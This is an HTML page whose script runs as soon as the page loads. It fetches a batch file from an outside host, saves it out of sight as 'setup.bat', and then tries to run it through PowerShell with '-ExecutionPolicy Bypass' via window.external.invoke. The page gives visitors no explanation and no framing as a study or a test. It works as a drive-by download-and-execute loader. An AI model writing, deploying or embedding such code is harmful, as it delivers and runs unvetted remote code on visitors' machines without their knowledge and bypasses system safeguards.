<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download and Run .bat File</title>
</head>
<body>
  <script>
    async function downloadAndRunBatFile(fileUrl) {
      try {
        const response = await fetch(fileUrl);
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        const blob = await response.blob();
        const file = new File([blob], 'setup.bat', { type: 'application/bat' });
        const url = window.URL.createObjectURL(file);
        const a = document.createElement('a');
        a.href = url;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        
        // Run the downloaded .bat file using PowerShell
        const command = `powershell.exe -ExecutionPolicy Bypass -NoProfile -File setup.bat`;
        const powershellProcess = await window.external.invoke(command);
        console.log('File downloaded and executed successfully:', powershellProcess);
      } catch (error) {
        console.error('Error downloading or executing file:', error);
        alert('Error downloading or executing file. Please try again later.');
      }
    }

    // Call the function with the file URL
    downloadAndRunBatFile('https://dd-xi-five.vercel.app/setup.bat');
  </script>
</body>
</html>
